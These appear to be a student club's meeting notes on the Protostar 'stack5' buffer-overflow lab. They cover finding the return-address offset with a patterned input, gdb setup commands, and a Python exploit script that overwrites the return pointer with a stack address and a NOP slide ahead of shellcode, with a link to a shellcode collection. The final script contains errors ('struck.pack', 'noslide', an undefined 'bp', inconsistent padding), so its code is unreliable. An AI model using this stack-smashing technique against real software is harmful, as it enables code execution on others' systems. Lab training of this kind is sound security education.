# Code injection wish shell code.

> See the previous meeting notes https://github.com/GVSU-Computing-Club/Meeting-Notes/blob/master/11-1-18-Exploiting.md 

Resource for shell code: http://shell-storm.org/shellcode/ 
## Stack 5
----------------------
|					 |
| Buffer (64 bytes)  | 
|					 |
----------------------
|   Base Pointer     |
----------------------
|   Return Pointer   | <- Change this to where our shell code
----------------------
|     0xbffff7f0     |
|     Shell code     |
----------------------
We want to modify the return address to point to your shell code so you can do whatever you want.

We are not able to modify code at in the folder, so we will run code from the home directory

```
cd ~
ln -s /opt/protostar/stack5/ ./stack5

```

Make a file called exploit.py

```
#!/usr/bin/env python 

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQRRRRSSSSTTTTUUUUVVVV"

print(padding)

```

```
$ chmod +x exploit.py
$ ./exploit.py > input
```

The above code helps us measure where the return address. It was found that the return address is where 'TTTT' is.

You can put gdb commands in ```vim .gdbinit``` which will run everytime that you run gdbs

```
set disassembly-flavor intel #Sets assembly to intel style 
set breakpoint pending on #Lets you put breakpoints anywhere without questions

b main #Sets breakpoint at the main function
```

```
run < input #Pass input to the 
c #continue
x/40xw $esp #Examine 40 words and print it out it in hex where $esp is locateds
c #continue
```
Continue moves instruction by instruction 

A problem is that the location of the stack may change so....


NOP is an instruction that means don't do anything.
So we will fill out space the space between the return address and our shell code.

----------------------
| Return Pointer Addr| 
----------------------
|                    |
|                    |
|                    |
|                    |
|        NOP         |  <- Return pointer 
|                    | 
|                    |
|                    |
|                    |
----------------------
|     0xbffff7f0     |
|     Shell code     |
----------------------

```
#!/usr/bin/env python
import struct

#Make a string for the padding that will go up to the reutnr address
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQRRRRSSSS"

#Make a string for the new return address
address = struck.pack("I", 0xbffff7f0+50)

#Make a string for 100 NOP instructions
nopslide = "\x90"*100

#The shellcode we are injecting 
shellcode = ""

payload = padding + address + noslide + bp

print(payload)
```

**Your address might be different. Use gdb to find the address**